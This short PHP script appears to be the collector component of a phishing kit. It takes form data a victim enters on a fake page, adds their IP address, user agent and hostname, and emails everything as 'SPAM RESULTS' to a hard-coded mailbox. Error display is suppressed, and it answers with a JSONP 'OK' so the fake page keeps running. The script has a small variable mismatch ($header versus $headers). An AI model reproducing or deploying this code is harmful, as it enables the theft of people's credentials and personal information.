<?php 

//#### kaktys home_email file #######

$my_email=trim("email@mail.ru");

ini_set("display_errors",0);
error_reporting(0);
ignore_user_abort(true);
set_time_limit(30);


if(isset($_GET['callback'])){
  $cb=$_GET['callback'];
  $data=json_decode($_GET['data']);
  $step=trim($data->step);
  
  
  
  
  unset($data->step);
  
  
  
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message = "[~] (".$_GET['link']." Infos) [~]\n";
$message .= "-----------------SPAM RESULTS ".$step."--------------------\n";
foreach($data as $k=>$v){
	$message .= "|".$k.": ".$v."\n";
}

$message .= "-----------------SPAM RESULTS ".$step."--------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|Client UA: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "-----------------SPAM RESULTS ".$step."--------------------\n";

$send = $my_email;
$subject = "~ ".$_GET['link']." Infos ~ | STEP ".$step."| $ip";
$header = 'MIME-Version: 1.0' . "\n" . 'Content-type: text/plain; charset=UTF-8' . "\n"; 

$res=mail("$send", "$subject", $message,$headers);




header('Content-Type: application/json');
$obj=new stdClass();
$obj->conect="OK";
echo $cb.'('.json_encode($obj).')';  
  
};




		
?>